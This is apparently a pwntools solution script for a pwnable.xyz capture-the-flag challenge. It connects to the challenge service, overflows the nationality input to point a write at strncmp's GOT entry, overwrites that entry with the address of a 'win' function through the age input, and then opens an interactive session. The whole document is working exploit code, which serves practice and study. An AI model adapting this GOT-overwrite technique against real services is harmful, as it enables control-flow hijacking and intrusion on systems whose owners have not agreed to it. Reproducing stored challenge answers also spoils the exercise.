from pwn import *

r = remote("svc.pwnable.xyz", 30031)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40099C
strncmp_got = 0x603018

sla(b"> ", b"2")
sla(b"nationality: ", b"a" * 0x10 + p64(strncmp_got))

sla(b"> ", b"3")
sla(b"age: ", str(win).encode())

sla(b"> ", b"4")

r.interactive()
